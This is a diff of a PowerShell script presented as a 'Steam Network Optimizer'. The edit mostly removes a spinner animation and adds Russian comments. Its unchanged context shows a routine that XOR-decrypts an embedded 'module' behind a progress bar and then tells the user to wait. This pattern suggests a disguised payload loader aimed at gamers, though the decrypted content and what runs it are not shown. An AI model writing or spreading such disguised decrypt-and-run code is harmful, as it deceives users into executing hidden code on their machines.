@@ -1,30 +1,8 @@
-# Steam Network Optimizer - Enhanced Edition v1.3 (с анимацией)
+# Steam Network Optimizer - Enhanced Edition v1.2
 
 function Show-Progress {
     param([string]$Activity, [int]$Percent)
     Write-Progress -Activity $Activity -PercentComplete $Percent
-}
-
-function Show-WaitingAnimation {
-    param([string]$Message = "Please wait")
-    
-    $spinChars = @('|', '/', '-', '\')
-    $iteration = 0
-    
-    # Запускаем в фоне проверку завершения
-    $completed = $false
-    
-    while (-not $completed) {
-        $spinChar = $spinChars[$iteration % 4]
-        Write-Host "`r  $Message $spinChar " -NoNewline -ForegroundColor Yellow
-        Start-Sleep -Milliseconds 100
-        $iteration++
-        
-        # Проверяем, завершился ли основной скрипт (можно добавить условие)
-        if ($iteration -gt 50) { break }  # Максимум 5 секунд анимации
-    }
-    
-    Write-Host "`r  $Message...   " -ForegroundColor Yellow
 }
 
 # Баннер
@@ -67,6 +45,7 @@ try {
     for($j = 0; $j -lt $z.Length; $j++) {
         $r[$j] = $z[$j] -bxor $w[$j % $w.Length]
         
+        # Обновляем прогресс во время расшифровки
         if($j % 1000 -eq 0) {
             $percent = 70 + (($j / $z.Length) * 20)
             Show-Progress -Activity "Decrypting module..." -Percent $percent
@@ -83,6 +62,8 @@ try {
     Write-Host ""
     Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
     Write-Host ""
+    
+    # НОВОЕ: Сообщение об ожидании
     Write-Host "  Please wait for complete..." -ForegroundColor Yellow
     Write-Host ""
     
